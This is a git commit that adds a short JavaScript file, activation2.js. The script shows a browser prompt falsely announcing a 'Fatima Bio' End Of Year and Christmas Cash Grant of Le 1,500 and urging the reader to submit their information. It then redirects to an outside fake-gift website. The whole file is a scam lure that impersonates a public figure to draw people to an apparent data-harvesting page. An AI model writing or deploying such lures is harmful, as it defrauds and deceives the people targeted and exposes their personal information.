ef211f7449e2d07efe47bbaf291bbf6d6b54194a
pizza-mi <habibuakoti@gmail.com>
2025-12-07 09:10:49 +0100

    Create activation2.js

---
+++ activation2.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('🎉 Fatima Bio: Congratulations, you are eligible to receive the Le 1,500 End Of Year & Christmas Cash Grant Transfer, Kindly press OK to submit your information and receive Le 1,500 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://yesfree-gifts.website/Fatima-Bio-Cash-Grant.html';
+}
